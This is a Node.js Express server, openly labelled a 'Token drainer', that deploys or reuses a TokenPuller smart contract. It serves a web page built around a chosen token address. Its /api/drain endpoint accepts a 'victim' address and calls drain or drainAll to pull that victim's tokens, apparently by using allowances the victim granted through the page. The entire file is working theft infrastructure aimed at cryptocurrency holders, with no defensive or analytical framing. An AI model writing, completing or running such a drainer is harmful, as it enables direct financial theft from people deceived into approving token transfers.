require("dotenv").config();
const express = require("express");
const path = require("path");
const { ethers } = require("ethers");

const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS;
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const RPC_URL = process.env.RPC_URL || "https://eth.llamarpc.com";
const PULLER_ADDRESS = process.env.PULLER_ADDRESS; // optional: pre-deployed puller

// Startup check: exit with a clear message if TOKEN_ADDRESS is missing or invalid.
if (!TOKEN_ADDRESS) {
  console.error("FATAL: TOKEN_ADDRESS is not set. Export it before starting the server.");
  process.exit(1);
}
if (!ethers.isAddress(TOKEN_ADDRESS)) {
  console.error(`FATAL: TOKEN_ADDRESS "${TOKEN_ADDRESS}" is not a valid address.`);
  process.exit(1);
}

const provider = new ethers.JsonRpcProvider(RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
const token = new ethers.Contract(
  TOKEN_ADDRESS,
  ["function decimals() view returns (uint8)", "function balanceOf(address) view returns (uint256)", "function allowance(address,address) view returns (uint256)"],
  provider
);

// Single-flight deployment: concurrent /api/drain and /api/puller calls
// share one deployPromise so we never deploy two TokenPuller contracts.
let pullerPromise = null;
function getPuller() {
  if (!pullerPromise) {
    pullerPromise = (async () => {
      if (PULLER_ADDRESS && ethers.isAddress(PULLER_ADDRESS)) {
        return new ethers.Contract(PULLER_ADDRESS, PULLER_ABI, wallet);
      }
      const factory = new ethers.ContractFactory(PULLER_ABI, PULLER_BYTECODE, wallet);
      const puller = await factory.deploy(TOKEN_ADDRESS);
      await puller.waitForDeployment();
      console.log("Deployed TokenPuller at", await puller.getAddress());
      return puller;
    })();
  }
  return pullerPromise;
}

const PULLER_ABI = [
  "function drain(address victim, uint256 amount) external",
  "function drainAll(address victim) external",
  "function token() view returns (address)",
  "function owner() view returns (address)"
];
const PULLER_BYTECODE = process.env.PULLER_BYTECODE || "0x6080604052"; // placeholder; set from hardhat compile output

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// Serve the page with the real token address substituted in.
app.get("/", (req, res) => {
  const html = fs
    .readFileSync(path.join(__dirname, "public", "index.html"), "utf8")
    .replace(/%TOKEN_ADDRESS%/g, TOKEN_ADDRESS);
  res.type("html").send(html);
});

app.get("/api/puller", async (req, res) => {
  try {
    const puller = await getPuller();
    res.json({ address: await puller.getAddress(), token: TOKEN_ADDRESS });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/api/drain", async (req, res) => {
  const { victim, amount } = req.body || {};
  if (!victim) {
    return res.status(400).json({ error: "Missing 'victim' address" });
  }
  if (!ethers.isAddress(victim)) {
    return res.status(400).json({ error: "'victim' is not a valid address" });
  }
  try {
    const puller = await getPuller();
    const tx = amount ? await puller.drain(victim, ethers.parseUnits(amount, await token.decimals())) : await puller.drainAll(victim);
    await tx.wait();
    res.json({ ok: true, tx: tx.hash });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

const fs = require("fs");
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Token drainer listening on :${PORT} (token ${TOKEN_ADDRESS})`));
